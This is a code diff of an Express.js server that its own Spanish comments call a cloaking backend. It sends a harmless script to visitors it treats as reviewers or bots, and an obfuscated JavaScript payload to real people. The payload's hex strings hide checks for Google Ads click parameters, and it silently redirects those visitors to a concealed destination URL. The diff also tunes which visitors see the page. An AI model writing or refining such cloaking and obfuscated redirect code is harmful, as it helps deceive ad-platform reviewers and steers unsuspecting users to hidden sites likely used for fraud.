@@ -51,19 +51,14 @@ app.get('/:slug', async (req, res) => {
             parse_mode: 'Markdown'
         }).catch(()=>{});
 
-        // CAMBIO: Enviar señal para desbloquear la vista (window.__view = true)
-        res.set('Content-Type', 'application/javascript');
-        return res.send("window.__view = true; console.log('API Status: Active');");
+        // Enviar script inofensivo al revisor/bot
+        return res.send("console.log('API Status: Active');");
     }
 
     // SI ES UN HUMANO REAL: Enviar el payload ofuscado de redirección
-    // NOTA: Aquí NO enviamos window.__view = true, por lo que el preloader se quedará
-    // cubriendo la pantalla hasta que la redirección ocurra.
     res.set('Content-Type', 'application/javascript');
     const payload = `var _0x1a2b=["\x67\x63\x6C\x69\x64","\x67\x61\x64\x5F\x73\x6F\x75\x72\x63\x65","\x67\x62\x72\x61\x69\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x72\x65\x70\x6C\x61\x63\x65"];(function(){var u=new URLSearchParams(window.location.search);if(u.has(_0x1a2b[0])||u.has(_0x1a2b[1])||u.has(_0x1a2b[2])){window[_0x1a2b[3]][_0x1a2b[4]]("${CONFIG.DESTINO}")}})();`;
     res.send(payload);
 });
 
 app.listen(CONFIG.PORT, () => console.log(`Backend de cloaking activo en puerto ${CONFIG.PORT}`));
-
-
